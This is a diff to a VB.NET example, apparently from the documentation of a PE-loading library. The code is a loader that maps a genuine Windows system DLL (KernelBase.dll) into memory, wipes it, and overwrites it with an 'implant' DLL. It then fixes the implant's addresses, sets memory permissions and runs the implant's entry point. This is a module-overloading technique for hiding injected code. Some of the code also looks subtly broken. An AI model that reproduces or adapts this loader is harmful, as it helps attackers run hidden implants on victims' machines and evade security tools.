@@ -223,17 +223,22 @@ example
 ```vb.net
 Imports System.Runtime.InteropServices
 
+#If WIN64 Then
+Imports SizeT = System.UInt64
+#ElseIf WIN32 Then
+Imports SizeT = System.UInt32
+#End If
 Module Module1
 
     Sub Main()
         Dim mapped As IntPtr = map_dll_image("C:\Windows\System32\KernelBase.dll")
-        Dim v_size As UInteger = 0
+        Dim v_size As UInteger
         Dim implant_dll = PeconvCLR.FuncLists.LoadPeExecutable("test.dll", v_size, 0)
         If implant_dll = IntPtr.Zero Then
             Console.WriteLine("Failed to load the implant!")
         End If
         If PeconvCLR.FuncLists.is_compatibile(implant_dll) Then
-            If PeconvCLR.FuncLists.RelocateModule(implant_dll, v_size, mapped, implant_dll) Then
+            If PeconvCLR.FuncLists.RelocateModule(implant_dll, v_size, mapped, implant_dll.ToInt64) Then
                 If overwrite_mapping(mapped, implant_dll, v_size) Then
                     Dim ep_rva As UInteger = PeconvCLR.FuncLists.GetEntrypoint_Rva(implant_dll)
                     Dim is_dll As Boolean = PeconvCLR.FuncLists.IsDll(implant_dll)
@@ -244,7 +249,6 @@ Module Module1
             End If
         End If
     End Sub
-    
     Private Function map_dll_image(ByVal dll_name As String) As IntPtr
         Dim hFile As IntPtr = CreateFileA(dll_name, GENERIC_READ, 0, Nothing, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, Nothing)
         If hFile = IntPtr.Zero Then
@@ -265,21 +269,21 @@ Module Module1
         Return sectionBaseAddress
     End Function
 
-    Private Function overwrite_mapping(ByVal mapped As IntPtr, ByRef implant_dll As Byte, ByVal implant_size As UInteger) As Boolean
+    Private Function overwrite_mapping(mapped As IntPtr, implant_dll As IntPtr, implant_size As UInteger) As Boolean
         Dim hProcess As IntPtr = GetCurrentProcess()
         Dim oldProtect As UInteger = 0
 
         Dim prev_size As UInteger = PeconvCLR.FuncLists.GetImagesize(mapped)
         If prev_size <> 0 Then
-            If Not VirtualProtect(DirectCast(mapped, Object), prev_size, PAGE_READWRITE, oldProtect) Then
+            If Not VirtualProtect(mapped, prev_size, PAGE_READWRITE, oldProtect) Then
                 Return False
             End If
             MemSet(mapped, 0, prev_size)
-            If Not VirtualProtect(DirectCast(mapped, Object), prev_size, PAGE_READONLY, oldProtect) Then
+            If Not VirtualProtect(mapped, prev_size, PAGE_READONLY, oldProtect) Then
                 Return False
             End If
         End If
-        If Not VirtualProtect(DirectCast(mapped, Object), implant_size, PAGE_READWRITE, oldProtect) Then
+        If Not VirtualProtect(mapped, implant_size, PAGE_READWRITE, oldProtect) Then
             If implant_size > prev_size Then
                 Console.Write("[-] The implant is too big for the target!" & vbLf)
             End If
@@ -292,8 +296,8 @@ Module Module1
         If Not set_sections_access(mapped, implant_dll, implant_size) Then
             Return False
         End If
+
     End Function
-    
     Private Function set_sections_access(ByVal mapped As IntPtr, ByRef implant_dll As IntPtr, ByVal implant_size As UInteger) As Boolean
         Dim oldProtect As UInteger = 0
         ' protect PE header
@@ -313,8 +317,7 @@ Module Module1
         Next i
         Return True
     End Function
-    
-        Private Function translate_protect(ByVal sec_charact As UInteger) As UInteger
+    Private Function translate_protect(ByVal sec_charact As UInteger) As UInteger
         If sec_charact And IMAGE_SCN_MEM_EXECUTE <> 0 AndAlso sec_charact And IMAGE_SCN_MEM_READ <> 0 AndAlso sec_charact And IMAGE_SCN_MEM_WRITE <> 0 Then
             Return PAGE_EXECUTE_READWRITE
         End If
@@ -332,7 +335,6 @@ Module Module1
         End If
         Return PAGE_READWRITE
     End Function
-    
     Private Sub run_implant(ByVal mapped As Object, ByVal ep_rva As UInteger, ByVal is_dll As Boolean)
         Dim implant_ep As IntPtr = DirectCast(mapped, IntPtr) + ep_rva
         Console.Write("[*] Executing Implant's Entry Point: ")
@@ -348,8 +350,7 @@ Module Module1
             exe_main()
         End If
     End Sub
-    
-    '==================================================================================================================
+
     <UnmanagedFunctionPointer(CallingConvention.Cdecl, CharSet:=CharSet.Unicode)>
     Public Delegate Function dll_mainDelegate(ByVal HINSTANCE As IntPtr, ByVal DWORD As UInteger, ByVal LPVOID As IntPtr) As Boolean
     <UnmanagedFunctionPointer(CallingConvention.Cdecl, CharSet:=CharSet.Unicode)>
@@ -461,5 +462,6 @@ Module Module1
     End Function
 
 End Module
+
 
 ```
